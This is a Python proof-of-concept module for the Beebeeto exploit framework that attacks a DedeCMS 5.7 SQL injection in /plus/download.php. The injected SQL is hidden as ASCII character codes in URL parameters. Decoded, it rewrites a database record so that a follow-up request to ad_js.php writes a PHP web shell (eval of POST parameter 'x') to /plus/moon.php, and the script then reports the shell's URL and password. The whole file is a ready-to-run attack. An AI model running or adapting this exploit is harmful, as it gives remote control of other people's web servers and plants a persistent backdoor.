#!/usr/bin/env python  
# coding=utf-8  

""" 
Site: http://www.beebeeto.com/ 
Framework: https://github.com/n0tr00t/Beebeeto-framework 
"""

import urllib2  
  
from baseframe import BaseFrame

class MyPoc(BaseFrame):  
    poc_info = {  
        # poc相关信息  
        'poc': {  
            'id': 'poc-2014-0015',  
            'name': 'dedecms 5.7 /download.php 注入GETSHELL漏洞 EXP',  
            'author': 'HoerWing',  
            'create_date': '2014-09-22',  
        },  
        # 协议相关信息  
        'protocol': {  
            'name': 'http',  
            'port': [80],  
            'layer4_protocol': ['tcp'],  
        },  
        # 漏洞相关信息  
        'vul': {  
            'app_name': 'dedecms',  
            'vul_version': ['5.7'],  
            'type': 'SQL Inject',  
            'tag': ['dedecms', 'download.php & ad_js.php', 'SQL Inject', 'GETSHELL'],  
            'desc': 'ExecuteNoneQuery2执行Sql但是没有进行防注入导致download.php有sql注入，进一步导致全局变量$GLOBALS可以被任意修改',  
            'references': ['http://yxmhero1989.blog.163.com/blog/static/1121579562013581535738/',  
            ],  
        },  
    }  
 
    @classmethod  
    def exploit(cls, args):  
        payload1 = "/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35"  
        payload2 = "/plus/ad_js.php?aid=19"
        shell = "/plus/moon.php"
        keyword = "mOon"
        vul_url1 = args['options']['target'] + payload1 
        vul_url2 = args['options']['target'] + payload2
        shell_url = args['options']['target'] + shell
        if args['options']['verbose']:  
            print '[*] Request URL: ' + vul_url1
            print '[*] Request URL: ' + vul_url2
        request1 = urllib2.urlopen(vul_url1)
        request2 = urllib2.urlopen(vul_url2)
        resp = urllib2.urlopen(shell_url)  
        content = resp.read() 
        if keyword in content:  
            args['success'] = True  
            args['poc_ret']['vul_url'] = vul_url2
            args['poc_ret']['shell'] = shell_url
            args['poc_ret']['password'] = 'x'
            return args  
        else:  
            args['success'] = False  
            return args  
  
    verify = exploit  
  
if __name__ == '__main__':  
    from pprint import pprint  
  
    mp = MyPoc()  
    pprint(mp.run())  